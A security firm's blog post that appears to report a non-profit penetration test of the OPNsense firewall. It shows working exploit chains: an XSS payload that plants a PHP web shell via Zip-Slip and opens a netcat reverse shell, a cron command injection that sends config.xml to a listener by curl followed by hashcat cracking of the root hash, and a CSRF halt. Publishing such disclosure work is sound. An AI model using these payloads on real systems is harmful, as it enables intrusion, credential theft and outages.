<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" ><![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" >
    
        <title>Security Audits, Penetration Tests, Security Awareness - LogicalTrust - [EN] A-Z: OPNsense - Penetration Test</title>
    
    <meta name="author" content="LogicalTrust" >
    
            <meta name="keywords" content="security audit, safety audits, penetration testing, hardening, E-Commerce audits, reverse engineering, risk analysis, pentests, DORA, NIS2">
    <meta name="description" content="Our specialists find the weakest points in your company and will show you how to fix them step-by-step, as well as how to improve your security." >
    <meta property="og:locale" content="en_EN" >
    <meta property="og:type" content="website" >
    
        <meta property="og:title" content="LogicalTrust - [EN] A-Z: OPNsense - Penetration Test" >
    
    
        <meta property="og:description" content="Recently we performed a non-profit penetration test of OPNsense - an open source, FreeBSD based firewall and routing platform with ~51.47K active instances according to censys.io. The assessment was focused on web GUI and API as well as some parts of the system backend. Work has been carried out in a period from June 12 to June 26, 2023. In total, around 120 hours were committed to the project.
" >
    
    <meta property="og:url" content="https://logicaltrust.net/" >
    <meta property="og:site_name" content="Security Audits, Penetration Tests - LogicalTrust" >
    <meta property="og:image" content="https://logicaltrust.net/images/responsive.png" >
    <meta property="og:image:width" content="651" >
    <meta property="og:image:height" content="545" >

    
    <meta name="robots" content="index, follow" >
    <meta name="robots" content="noodp" >
    <meta name="robots" content="noydir" >
    <link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css" >
    <link href="/css/ie10.css" rel="stylesheet" type="text/css" >
    <link href="/css/main.css" rel="stylesheet" type="text/css" >
    <link href="/css/blog.css" rel="stylesheet" type="text/css" >
    <link rel="shortcut icon" href="/favicon.png">
    <!--[if lt IE 9]><script src="js/html5-respond.min.js"></script><![endif]-->
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}

  gtag('consent', 'default', {
    'ad_storage': 'denied',
    'ad_user_data': 'denied',
    'ad_personalization': 'denied',
    'analytics_storage': 'denied'
  });
</script>

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-PNXSN84');</script>
<!-- End Google Tag Manager -->

<script>
  function consentGranted() {
    gtag('consent', 'update', {
      'ad_storage': 'granted',
      'ad_user_data': 'granted',
      'ad_personalization': 'granted',
      'analytics_storage': 'granted'
    });
  }
</script>

</head>
<body id="home" class="body overflow-x">
    <div class="wrapper">
        
            
        
            
        
            
                <header class="header header--services">
            
        
            
        
            
        
            <nav class="navbar navbar-default navbar-fixed-top navbar--custom">
                <div class="container container--relative">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed navbar-toggle--custom" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                            <span class="sr-only">Menu</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <div class="navbar-brand"><a href="/en/" aria-label="Logicaltrust"><img src="/images/logo.svg" alt="" width="300" height="53" class="navbar-brand__image"></a></div>
                    </div>
                    <div id="navbar" class="collapse navbar-collapse navbar--right">
                        <ul class="nav navbar-nav navbar__list">
                            
                                
                                
                                
                                
                                <li class="navbar__item"><a href="/en/" >Home</a></li>
                            
                                
                                
                                
                                
                                <li class="navbar__item"><a href="/en/#services" class="smooth">Services</a></li>
                            
                                
                                
                                
                                
                                <li class="navbar__item"><a href="/blog.html" class="current">Blog</a></li>
                            
                                
                                
                                
                                
                                <li class="navbar__item"><a href="/about.html" >About us</a></li>
                            
                                
                                
                                
                                
                                <li class="navbar__item"><a href="#contact" class="smooth">Contact</a></li>
                            
                        </ul>
                    </div>
                    <div class="languages">
                        <ul class="languages__list">
                            <li class="languages__item"><a href="/en/"><strong>EN</strong></a></li>
                            
                                
                                    <li class="languages__item"><a href="/">PL</a></li>
                                
                            
                                
                            
                        </ul>
                    </div>
                </div>
            </nav>
            
        </header>
        
	        <section class="blog blog--padding overflow-x">
    	        <div class="container">
					<article class="post">
					  <h1>[EN] A-Z: OPNsense - Penetration Test</h1>

					  <div class="entry">
						<p>Recently we performed a non-profit penetration test of <a href="https://opnsense.org/">OPNsense</a> - an open source, FreeBSD based firewall and routing platform with ~51.47K active instances according to censys.io. The assessment was focused on web GUI and API as well as some parts of the system backend. Work has been carried out in a period from June 12 to June 26, 2023. In total, around 120 hours were committed to the project.</p>

<p>During the test we managed to find many interesting and varied vulnerabilities, e.g., Cross-Site Scripting, Cross-Site Request Forgery, Open Redirect, Insecure Permissions, OS Command Injection and Zip-Slip which eventually leads to root shell. You can find all of them in the <a href="/pentest-reports/report-security-assessment-opnsense-1.0.pdf" title="LogicalTrust Penetration Tests Report of OPNsense">Full PDF Report</a> which is also a great example of what our commercial clients receive.</p>

<p>We would like to show you three scenarios of how vulnerabilities that we found could be chained together to perform attacks on the OPNsense instance.</p>

<h1 id="scenario-1---reflected-xss-leads-to-root-rce-via-zip-slip">Scenario 1 - Reflected XSS leads to root RCE via Zip-Slip</h1>

<p>In this scenario we used Reflected Cross-Site Scripting vulnerability (LT-0017) to deliver our payload to the administrator.
Sending GET request to <code class="language-plaintext highlighter-rouge">https://opnsense/ui/cron/item/open/0'+alert(window.origin)+'</code> would result in the following response:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en-US"</span> <span class="na">class=</span><span class="s">"no-js"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
[...]
<span class="nt">&lt;script&gt;</span>
<span class="p">[...]</span>
	<span class="nf">openDialog</span><span class="p">(</span><span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="o">+</span><span class="nf">alert</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span><span class="o">+</span><span class="dl">''</span><span class="p">);</span>
<span class="p">[...]</span></code></pre></figure>

<p>After an administrator clicks on our link, we need to send six requests from their browser. First two requests create new Captive Portal template, another three enable Captive Portal with the selected template, and the last one spawns netcat reverse shell with our brand-new <code class="language-plaintext highlighter-rouge">luta.php</code> webshell.</p>

<h3 id="example-javascript-payload">Example Javascript payload:</h3>

<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="kd">let</span> <span class="nx">requestData</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">zipslip</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">UEsDBAoAAAAAAJOO5VYdoS5KEAAAABAAAAA3ABwALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3d3dy9sdXRhLnBocFVUCQADxZGlZPyPpWR1eAsAAQQAAAAABAAAAAA8Pz1gJF9HRVRbeF1gPz4KUEsDBAoAAAAAAEGO5VYAAAAAAAAAAAAAAAAEABwAY3NzL1VUCQADKpGlZCuRpWR1eAsAAQToAwAABOgDAABQSwMEFAAAAAgAMn7lVqx0FrPKAAAAvQEAAAwAHABleGNsdWRlLmxpc3RVVAkAA/B0pWSLkaVkdXgLAAEE6AMAAAToAwAAjY8xbsMwDEV3nYJAhk5RgN6gd+gFZJeSmVKiQdJRffvKKbpk8sjPx/8/L/C5kAGTOczSPFEz8AUhE2NLFY8pOdS0QxOHCUEeqF3JHRtM+xPeDBX6MoRZMTm1AvNmLhUc68rJ0WK4wAcz0FAMqI27/9wu7e3pPC4Uv/6WeNTJVOJP5SNGNoWso1AX/Q6z2W0ScXNNaxxTrGl9USu1YxPyeMtuhfd1oeFp1yVx5tHRropl46QRxc9g9ihnMPd8BuuST3Pv4f762t3CL1BLAwQKAAAAAABEjuVWAAAAAAAAAAAAAAAABgAcAGZvbnRzL1VUCQADL5GlZDCRpWR1eAsAAQToAwAABOgDAABQSwMECgAAAAAASo7lVgAAAAAAAAAAAAAAAAcAHABpbWFnZXMvVVQJAAM8kaVkQZGlZHV4CwABBOgDAAAE6AMAAFBLAwQKAAAAAABTjuVW5yL1pwQAAAAEAAAACgAcAGluZGV4Lmh0bWxVVAkAA06RpWSLkaVkdXgLAAEE6AMAAAToAwAAcG9jClBLAwQKAAAAAABPjuVWAAAAAAAAAAAAAAAAAwAcAGpzL1VUCQADRZGlZEaRpWR1eAsAAQToAwAABOgDAABQSwECHgMKAAAAAACTjuVWHaEuShAAAAAQAAAANwAYAAAAAAABAAAApIEAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3d3dy9sdXRhLnBocFVUBQADxZGlZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAEGO5VYAAAAAAAAAAAAAAAAEABgAAAAAAAAAEADtQYEAAABjc3MvVVQFAAMqkaVkdXgLAAEE6AMAAAToAwAAUEsBAh4DFAAAAAgAMn7lVqx0FrPKAAAAvQEAAAwAGAAAAAAAAQAAAICBvwAAAGV4Y2x1ZGUubGlzdFVUBQAD8HSlZHV4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAESO5VYAAAAAAAAAAAAAAAAGABgAAAAAAAAAEADtQc8BAABmb250cy9VVAUAAy+RpWR1eAsAAQToAwAABOgDAABQSwECHgMKAAAAAABKjuVWAAAAAAAAAAAAAAAABwAYAAAAAAAAABAA7UEPAgAAaW1hZ2VzL1VUBQADPJGlZHV4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAFOO5VbnIvWnBAAAAAQAAAAKABgAAAAAAAEAAACAgVACAABpbmRleC5odG1sVVQFAANOkaVkdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAAAAAAT47lVgAAAAAAAAAAAAAAAAMAGAAAAAAAAAAQAO1BmAIAAGpzL1VUBQADRZGlZHV4CwABBOgDAAAE6AMAAFBLBQYAAAAABwAHAEsCAADVAgAAAAA=</span><span class="dl">"</span><span class="p">}</span>
<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/captiveportal/service/saveTemplate</span><span class="dl">"</span><span class="p">,</span> <span class="nx">requestData</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/captiveportal/service/reconfigure</span><span class="dl">"</span><span class="p">,</span> <span class="p">{},</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/captiveportal/service/searchTemplates</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span><span class="dl">"</span><span class="s2">current</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="dl">"</span><span class="s2">rowCount</span><span class="dl">"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="dl">"</span><span class="s2">sort</span><span class="dl">"</span><span class="p">:{},</span><span class="dl">"</span><span class="s2">searchPhrase</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">zipslip</span><span class="dl">"</span><span class="p">},</span> <span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">status</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="kd">let</span> <span class="nx">requestData</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">zone</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">enabled</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">interfaces</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">lan</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">authservers</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">Local Database</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">alwaysSendAccountingReqs</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">authEnforceGroup</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">idletimeout</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">hardtimeout</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">concurrentlogins</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">certificate</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">servername</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">allowedAddresses</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">allowedMACAddresses</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">transparentHTTPProxy</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">transparentHTTPSProxy</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">extendedPreAuthData</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">template</span><span class="dl">"</span><span class="p">:</span><span class="nx">data</span><span class="p">.</span><span class="nx">rows</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">uuid</span><span class="p">,</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">poc</span><span class="dl">"</span><span class="p">}}</span>
			<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/captiveportal/settings/addZone/</span><span class="dl">"</span><span class="p">,</span> <span class="nx">requestData</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/captiveportal/service/reconfigure</span><span class="dl">"</span><span class="p">,</span> <span class="p">{},</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
					<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/luta.php?x=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;%261|nc 192.168.1.118 1337 &gt;/tmp/f</span><span class="dl">"</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">)</span>
				<span class="p">})</span>
			<span class="p">})</span>
		<span class="p">})</span>
	<span class="p">})</span>
<span class="p">})</span></code></pre></figure>

<p>Above script can be base64 encoded and put inside the URL:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">https://opnsense/ui/cron/item/open/0'+eval(atob('bGV0IHJlcXVlc3REYXRhID0geyJuYW1[...]gkJCQl9KQoJCQl9KQoJCX0pCgl9KQp9KQo='))+'</code></pre></figure>

<p>What’s interesting is that the application accepts templates in ZIP format, and then it extracts all of their contents to the template directory. However, the way in which the application extracts the files makes it vulnerable to the Zip-Slip attack (LT-0014):</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># source: src/opnsense/scripts/OPNsense/CaptivePortal/overlay_template.py
</span><span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="nc">ZipFile</span><span class="p">(</span><span class="n">input_data</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="n">compression</span><span class="o">=</span><span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span> <span class="k">as</span> <span class="n">zf_in</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">zf_info</span> <span class="ow">in</span> <span class="n">zf_in</span><span class="p">.</span><span class="nf">infolist</span><span class="p">():</span>
        <span class="k">if</span> <span class="n">zf_info</span><span class="p">.</span><span class="n">filename</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">:</span>
            <span class="n">target_filename</span> <span class="o">=</span> <span class="sh">'</span><span class="s">%s%s</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">target_directory</span><span class="p">,</span> <span class="n">zf_info</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
            <span class="n">file_target_directory</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">target_filename</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isdir</span><span class="p">(</span><span class="n">file_target_directory</span><span class="p">):</span>
                <span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">file_target_directory</span><span class="p">)</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">target_filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_out</span><span class="p">:</span>
                <span class="n">f_out</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">zf_in</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">zf_info</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span>
            <span class="n">os</span><span class="p">.</span><span class="nf">chmod</span><span class="p">(</span><span class="n">target_filename</span><span class="p">,</span> <span class="mo">0o444</span><span class="p">)</span></code></pre></figure>

<p>By using <code class="language-plaintext highlighter-rouge">../</code> sequences it is possible to extract files to other directories. This allows us to extract PHP file to the web root - <code class="language-plaintext highlighter-rouge">/usr/local/www</code>.</p>

<p>Our ZIP archive looks like this, where <code class="language-plaintext highlighter-rouge">luta.php</code> is a simple PHP web shell:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">Archive:  zipslip.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       16  2023-07-05 17:52   ../../../../../../../../../../../usr/local/www/luta.php
        0  2023-07-05 17:50   css/
      445  2023-07-05 15:49   exclude.list
        0  2023-07-05 17:50   fonts/
        0  2023-07-05 17:50   images/
        4  2023-07-05 17:50   index.html
        0  2023-07-05 17:50   js/
---------                     -------
      465                     7 files</code></pre></figure>

<p>Since the PHP process is being ran as a root user, the shell is granted root privileges as well.</p>

<h3 id="proof-of-concept-video">Proof of Concept Video:</h3>

<iframe width="640" height="360" class="google-video" src="https://drive.google.com/file/d/1oFMhUquel2KjOvcBV0dleMaKH3g-EE28/preview" allowfullscreen="true" allow="autoplay"></iframe>

<h1 id="scenario-2---reflected-xss---os-command-injection---root-password-retrieval-via-configxml-insecure-permissions">Scenario 2 - Reflected XSS -&gt; OS Command Injection -&gt; root password retrieval via <code class="language-plaintext highlighter-rouge">config.xml</code> insecure permissions</h1>

<p>In the second scenario the payload is also delivered through Reflected XSS, but this time the vulnerability is introduced in Certificates tab (LT-0002). Sending request to <code class="language-plaintext highlighter-rouge">https://opnsense/system_certmanager.php?act=%22%3E%3Csvg/onload=alert(window.origin)%3E&amp;id=0</code> results in the following response body:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en-US"</span> <span class="na">class=</span><span class="s">"no-js"</span><span class="nt">&gt;</span>
[...]
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">name=</span><span class="s">"iform"</span> <span class="na">id=</span><span class="s">"iform"</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"N3p4b1ZZUXpTc2VFWmFaLzRHQW5Ydz09"</span> <span class="na">value=</span><span class="s">"VUlyWVI0bWkyYkdjWDNvVGprQ1F2UT09"</span> <span class="na">autocomplete=</span><span class="s">"new-password"</span> <span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"id"</span> <span class="na">id=</span><span class="s">"id"</span> <span class="na">value=</span><span class="s">"0"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"act"</span> <span class="na">id=</span><span class="s">"action"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">alert(window.origin)</span><span class="nt">&gt;</span>"/&gt;
<span class="nt">&lt;/form&gt;</span>
[...]</code></pre></figure>

<p>We want to send request to <code class="language-plaintext highlighter-rouge">/api/cron/settings/addJob/</code> in order to add new cron job. The application allows only specific commands to be executed via cron, however, by including single quotes (<code class="language-plaintext highlighter-rouge">'</code>) and newline character (<code class="language-plaintext highlighter-rouge">\n</code>) in the command parameters, we can define completely separate cron job and execute any command as <code class="language-plaintext highlighter-rouge">nobody</code> user (LT-0016).</p>

<h3 id="example-javascript-payload-1">Example Javascript payload:</h3>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">let</span> <span class="nx">requestData</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">job</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">enabled</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">minutes</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">hours</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">days</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">months</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">weekdays</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">command</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">firmware auto-update</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">parameters</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">'</span><span class="se">\n</span><span class="s2">*</span><span class="se">\t</span><span class="s2">*</span><span class="se">\t</span><span class="s2">*</span><span class="se">\t</span><span class="s2">*</span><span class="se">\t</span><span class="s2">* curl -F config=@/conf/config.xml 192.168.1.118:1337 #'</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">poc2</span><span class="dl">"</span><span class="p">}}</span>
<span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/cron/settings/addJob/</span><span class="dl">"</span><span class="p">,</span> <span class="nx">requestData</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="nf">ajaxCall</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/cron/service/reconfigure</span><span class="dl">"</span><span class="p">,</span> <span class="p">{},</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
		<span class="p">})</span>
	<span class="p">})</span>
<span class="p">},</span> <span class="mi">1000</span><span class="p">)</span></code></pre></figure>

<p>…and turned into an URL:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">https://opnsense/system_certmanager.php?act=%22%3E%3Csvg/onload=eval(atob(%27bGV0IHJlcXVlc3REYXRh[...]HsKCQl9KQoJfSkKfSwgMTAwMCk=%27))%3E&amp;id=0</code></pre></figure>

<p>After the administrator opens the link, we can see our command added to the crontab:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">root@OPNsense:~ # cat /var/cron/tabs/nobody
# DO NOT EDIT THIS FILE -- OPNsense auto-generated file
#
# User-defined crontab files can be loaded via /etc/cron.d
# or /usr/local/etc/cron.d and follow the same format as
# /etc/crontab, see the crontab(5) manual page.
SHELL=/bin/sh
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
#minute	hour	mday	month	wday	command
# Origin/Description: cron/poc2
*	*	*	*	*	/usr/local/sbin/configctl -d firmware auto-update '
*	*	*	*	* curl -F config=@/conf/config.xml 192.168.1.118:1337 #'</code></pre></figure>

<p>In the above payload we are adding next vulnerability to the chain - even though we only have privileges of user <code class="language-plaintext highlighter-rouge">nobody</code>, insecure permissions (LT-0003) grant us read access to the configuration file:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">root@OPNsense:/conf # ls -la
total 112
drwxr-xr-x   4 root  wheel    512 Jul 31 12:41 .
drwxr-xr-x  21 root  wheel   1024 Jul 31 12:44 ..
drwxr-xr-x   2 root  wheel   4096 Jul 31 14:13 backup
-rw-r-----   1 root  wheel  49152 Jul 31 12:41 captiveportal.sqlite
-rw-r--r--   1 root  wheel  39796 Jul 31 14:13 config.xml
-rw-r-----   1 root  wheel    383 Jul 31 12:41 dhcpleases.tgz
-rw-r-----   1 root  wheel     40 Jul 31 14:13 event_config_changed.json
drwxr-xr-x   2 root  wheel    512 Jul  5 12:40 sshd</code></pre></figure>

<p>Soon <code class="language-plaintext highlighter-rouge">config.xml</code> is sent to our listener:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">feliks@debian ~&gt; nc -lkp 1337
POST / HTTP/1.1
Host: 192.168.1.118:1337
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 39119
Content-Type: multipart/form-data; boundary=------------------------06c60d07c2a2ae1e

--------------------------06c60d07c2a2ae1e
Content-Disposition: form-data; name="config"; filename="config.xml"
Content-Type: application/xml

&lt;?xml version="1.0"?&gt;
&lt;opnsense&gt;
  &lt;theme&gt;opnsense&lt;/theme&gt;
  &lt;sysctl&gt;
[...]
    &lt;user&gt;
      &lt;name&gt;root&lt;/name&gt;
      &lt;descr&gt;System Administrator&lt;/descr&gt;
      &lt;scope&gt;system&lt;/scope&gt;
      &lt;groupname&gt;admins&lt;/groupname&gt;
      &lt;password&gt;$2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY/j21TwBfS&lt;/password&gt;
      &lt;uid&gt;0&lt;/uid&gt;
    &lt;/user&gt;
[...]</code></pre></figure>

<p>Congratulations, it’s a bcrypt hash of a root password!</p>

<p>Finally, we feed it to <code class="language-plaintext highlighter-rouge">hashcat</code>:</p>

<figure class="highlight"><pre><code class="language-x" data-lang="x">feliks@debian ~&gt; hashcat -m 3200 '$2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY/j21TwBfS' -a 0 wordlist.txt
hashcat (v6.1.1) starting...

[...]

$2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY/j21TwBfS:opnsense
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY...1TwBfS
Time.Started.....: Mon Jul 31 17:04:47 2023 (0 secs)
Time.Estimated...: Mon Jul 31 17:04:47 2023 (0 secs)
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       10 H/s (3.82ms) @ Accel:2 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6/6 (100.00%)
Rejected.........: 0/6 (0.00%)
Restore.Point....: 0/6 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: luta -&gt; opnsense

Started: Mon Jul 31 17:04:13 2023
Stopped: Mon Jul 31 17:04:48 2023</code></pre></figure>

<h1 id="scenario-3---csrf-that-halts-the-firewall">Scenario 3 - CSRF that halts the firewall</h1>
<p>This one is quite straightforward. Administrator visits our website, from which we redirect them to <code class="language-plaintext highlighter-rouge">https://opnsense/api/core/system/halt</code>, to turn off the instance.
